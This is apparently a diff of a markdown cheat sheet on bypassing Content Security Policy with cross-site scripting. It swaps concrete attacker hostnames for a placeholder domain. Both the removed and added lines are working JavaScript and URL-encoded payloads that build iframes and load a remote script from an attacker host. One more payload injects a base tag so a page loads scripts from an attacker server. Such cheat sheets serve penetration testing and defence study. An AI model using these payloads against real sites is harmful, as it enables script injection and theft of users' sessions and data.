@@ -50,11 +50,11 @@ Use a callback function from a whitelisted source listed in the CSP.
 
 **Payload**:
 
-`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`
+`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//[ATTACKER.DOMAIN.TLD]/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`
 
 ```js
 script=document.createElement('script');
-script.src='//remoteattacker.lab/csp.js';
+script.src='//[ATTACKER.DOMAIN.TLD]/csp.js';
 window.frames[0].document.head.appendChild(script);
 ```
 
@@ -69,7 +69,7 @@ Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-yo
 **Payload**:
 
 ```js
-d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[ATTACKER.DOMAIN.TLD]";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
 Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
@@ -126,13 +126,13 @@ Source: [@404death](https://twitter.com/404death/status/1191222237782659072)
 - Inject a base tag.
 
   ```html
-  <base href=http://www.attacker.com>
+  <base href=http://[ATTACKER.DOMAIN.TLD]>
   ```
 
 - Host your custom js file at the same path that one of the website's script.
 
   ```ps1
-  http://www.attacker.com/PATH.js
+  http://[ATTACKER.DOMAIN.TLD]/PATH.js
   ```
 
 ## Bypass CSP header sent by PHP
